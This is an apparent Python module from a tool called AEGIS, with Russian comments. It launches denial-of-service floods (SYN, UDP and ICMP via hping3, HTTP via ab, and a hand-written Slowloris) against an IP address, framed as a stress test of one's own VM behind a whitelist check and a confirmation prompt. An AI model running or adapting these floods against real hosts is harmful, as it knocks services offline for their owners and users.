#!/usr/bin/env python3
# DoS — стресс-тест СВОЕЙ VM (только whitelist)

"""
Использование:
    python3 -m modules.ddos <target> [method] [duration]

Примеры:
    python3 -m modules.ddos 82.204.184.177 syn 10
    python3 -m modules.ddos 82.204.184.177 http 15
    python3 -m modules.ddos 82.204.184.177 slowloris 20
"""

import os
import sys
import socket
import signal
import subprocess
import time
from datetime import datetime

_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)

from safety.whitelist import is_whitelisted


_stop_requested = False


def _handle_sigint(sig, frame):
    global _stop_requested
    _stop_requested = True
    print("\n[!] Прерывание — останавливаюсь...", flush=True)


signal.signal(signal.SIGINT, _handle_sigint)


# ============================================================
# 1. SYN-flood (hping3)
# ============================================================

def syn_flood(target, port=80, duration=10):
    if not is_whitelisted(target):
        return {"success": False, "log": f"[!] {target} не в whitelist"}

    log = [f"[*] SYN-flood -> {target}:{port}"]
    print(log[0], flush=True)

    # Без -I: пусть hping сам выберет интерфейс.
    # Без --rand-source: пакеты должны возвращаться на наш MAC.
    cmd = [
        "sudo", "hping3",
        "-S",
        "-p", str(port),
        "--flood",
        "-d", "120",
        target,
    ]
    print(f"[*] Запуск: {' '.join(cmd)}", flush=True)

    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL)
    except FileNotFoundError:
        return {"success": False, "log": "hping3 не найден"}
    except Exception as e:
        return {"success": False, "log": f"[!] {e}"}

    end_time = time.time() + duration
    start = time.time()
    try:
        while time.time() < end_time and not _stop_requested:
            time.sleep(0.5)
            print(f"\r  [SYN] идёт... {time.time()-start:.1f}s / {duration}s",
                  end="", flush=True)
    finally:
        print()
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()

    log.append(f"[+] SYN-flood завершён за {time.time()-start:.1f}s")
    return {"success": True, "log": "\n".join(log)}


# ============================================================
# 2. UDP-flood
# ============================================================

def udp_flood(target, port=80, duration=10):
    if not is_whitelisted(target):
        return {"success": False, "log": f"[!] {target} не в whitelist"}

    log = [f"[*] UDP-flood -> {target}:{port}"]
    print(log[0], flush=True)

    cmd = [
        "sudo", "hping3",
        "--udp",
        "-p", str(port),
        "--flood",
        "-d", "65495",
        target,
    ]
    print(f"[*] Запуск: {' '.join(cmd)}", flush=True)

    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL)
    except FileNotFoundError:
        return {"success": False, "log": "hping3 не найден"}
    except Exception as e:
        return {"success": False, "log": f"[!] {e}"}

    end_time = time.time() + duration
    start = time.time()
    try:
        while time.time() < end_time and not _stop_requested:
            time.sleep(0.5)
            print(f"\r  [UDP] идёт... {time.time()-start:.1f}s",
                  end="", flush=True)
    finally:
        print()
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()

    log.append(f"[+] UDP-flood завершён за {time.time()-start:.1f}s")
    return {"success": True, "log": "\n".join(log)}


# ============================================================
# 3. HTTP-flood (ab)
# ============================================================

def http_flood(target, port=80, duration=10, concurrency=500):
    if not is_whitelisted(target):
        return {"success": False, "log": f"[!] {target} не в whitelist"}

    url = f"http://{target}:{port}/"
    n = concurrency * 1000

    log = [f"[*] HTTP-flood -> {url}, n={n}, c={concurrency}"]
    print(log[0], flush=True)

    cmd = ["ab", "-n", str(n), "-c", str(concurrency), "-k", url]
    print(f"[*] Запуск: {' '.join(cmd)}", flush=True)

    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL)
    except FileNotFoundError:
        return {"success": False, "log": "ab не найден. brew install httpd"}
    except Exception as e:
        return {"success": False, "log": f"[!] {e}"}

    end_time = time.time() + duration
    start = time.time()
    try:
        while time.time() < end_time and not _stop_requested:
            time.sleep(0.5)
            print(f"\r  [HTTP] идёт... {time.time()-start:.1f}s",
                  end="", flush=True)
    finally:
        print()
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()

    log.append(f"[+] HTTP-flood завершён за {time.time()-start:.1f}s")
    return {"success": True, "log": "\n".join(log)}


# ============================================================
# 4. Slowloris (Python)
# ============================================================

def slowloris(target, port=80, duration=10, sockets=800):
    if not is_whitelisted(target):
        return {"success": False, "log": f"[!] {target} не в whitelist"}

    log = [f"[*] Slowloris -> {target}:{port}, sockets={sockets}"]
    print(log[0], flush=True)

    alive = []
    start = time.time()

    print("[*] Открываю соединения...", flush=True)
    for i in range(sockets):
        if _stop_requested:
            break
        try:
            s = socket.socket()
            s.settimeout(4)
            s.connect((target, port))
            s.send(b"GET /?" + str(i).encode() + b" HTTP/1.1\r\n")
            s.send(b"Host: " + target.encode() + b"\r\n")
            alive.append(s)
        except Exception:
            break

    print(f"[+] Открыто {len(alive)} соединений", flush=True)

    end_time = start + duration
    try:
        while time.time() < end_time and not _stop_requested and alive:
            for s in list(alive):
                try:
                    s.send(b"X-a: keep-alive\r\n")
                except Exception:
                    alive.remove(s)
            print(f"\r  [Slowloris] живых: {len(alive)}, "
                  f"{time.time()-start:.1f}s / {duration}s",
                  end="", flush=True)
            time.sleep(5)
    finally:
        print()
        for s in alive:
            try:
                s.close()
            except Exception:
                pass

    log.append(f"[+] Slowloris завершён за {time.time()-start:.1f}s")
    return {"success": True, "log": "\n".join(log)}


# ============================================================
# 5. ICMP-flood
# ============================================================

def icmp_flood(target, port=None, duration=10):
    if not is_whitelisted(target):
        return {"success": False, "log": f"[!] {target} не в whitelist"}

    log = [f"[*] ICMP-flood -> {target}"]
    print(log[0], flush=True)

    cmd = ["sudo", "hping3", "--icmp", "--flood", "-d", "65495", target]
    print(f"[*] Запуск: {' '.join(cmd)}", flush=True)

    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL)
    except FileNotFoundError:
        return {"success": False, "log": "hping3 не найден"}
    except Exception as e:
        return {"success": False, "log": f"[!] {e}"}

    end_time = time.time() + duration
    start = time.time()
    try:
        while time.time() < end_time and not _stop_requested:
            time.sleep(0.5)
            print(f"\r  [ICMP] идёт... {time.time()-start:.1f}s",
                  end="", flush=True)
    finally:
        print()
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()

    log.append(f"[+] ICMP-flood завершён за {time.time()-start:.1f}s")
    return {"success": True, "log": "\n".join(log)}


METHODS = {
    "syn": (syn_flood, "SYN-flood (hping3)"),
    "udp": (udp_flood, "UDP-flood (hping3)"),
    "http": (http_flood, "HTTP-flood (ab)"),
    "slowloris": (slowloris, "Slowloris (Python)"),
    "icmp": (icmp_flood, "ICMP-flood (hping3)"),
}


def print_help():
    print("AEGIS DoS — стресс-тест СВОЕЙ VM")
    print()
    print("Использование:")
    print("    python3 -m modules.ddos <target> [method] [duration]")
    print()
    print("Методы:")
    for key, (_, desc) in METHODS.items():
        print(f"    {key:12} — {desc}")
    print()
    print("Примеры:")
    print("    python3 -m modules.ddos 82.204.184.177 syn 10")
    print("    python3 -m modules.ddos 82.204.184.177 http 15")


def run_stress(target, method="syn", duration=10):
    if not is_whitelisted(target):
        print(f"[!] {target} не в whitelist. Разрешено: только свои VM.")
        return

    if method not in METHODS:
        print(f"[!] Неизвестный метод: {method}")
        print_help()
        return

    print()
    print("=" * 60)
    print(f"  AEGIS Стресс-тест")
    print(f"  Цель:     {target}")
    print(f"  Метод:    {method} ({METHODS[method][1]})")
    print(f"  Длительность: {duration}s")
    print("=" * 60)
    print()

    duration = min(duration, 20)
    ans = input("Запустить? [y/N]: ").strip().lower()
    if ans != "y":
        print("Отменено.")
        return

    print()
    t0 = time.time()
    result = METHODS[method][0](target, duration=duration)
    elapsed = time.time() - t0

    print()
    print("=" * 60)
    print(f"  {'OK' if result['success'] else 'FAIL'}  |  Время: {elapsed:.1f}s")
    print("=" * 60)
    print()
    print(result["log"])


def main():
    args = sys.argv[1:]
    if not args or args[0] in ("-h", "--help", "help"):
        print_help()
        return

    target = args[0]
    method = args[1] if len(args) > 1 else "http"
    duration = int(args[2]) if len(args) > 2 else 10

    run_stress(target, method=method, duration=duration)


if __name__ == "__main__":
    main()
